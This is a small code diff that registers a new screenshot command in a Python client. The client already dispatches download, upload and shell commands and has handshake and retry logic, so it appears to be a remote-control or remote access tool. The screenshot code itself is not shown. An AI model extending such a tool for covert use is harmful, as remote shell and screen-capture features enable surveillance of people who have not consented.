@@ -21,6 +21,7 @@ from common.constants import (
     RETRY_BACKOFF_FACTOR,
     RETRY_DELAY,
     RETRY_DELAY_MAX,
+    SCREENSHOT_ACTION,
     SHELL_ACTION,
     SOCKET_TIMEOUT_SEC,
     TEST_ACTION,
@@ -30,6 +31,7 @@ from client.commands.help import HelpCommand
 from client.commands.download import DownloadCommand
 from client.commands.upload import UploadCommand
 from client.commands.shell import ShellCommand
+from client.commands.screenshot import ScreenshotCommand
 from common.protocol import (
     build_command,
     build_handshake_command,
@@ -67,6 +69,7 @@ class Client:
             DOWNLOAD_ACTION: DownloadCommand(),
             UPLOAD_ACTION: UploadCommand(),
             SHELL_ACTION: ShellCommand(),
+            SCREENSHOT_ACTION: ScreenshotCommand(),
         }
         self._retry_count = 0
         self._shutdown = False
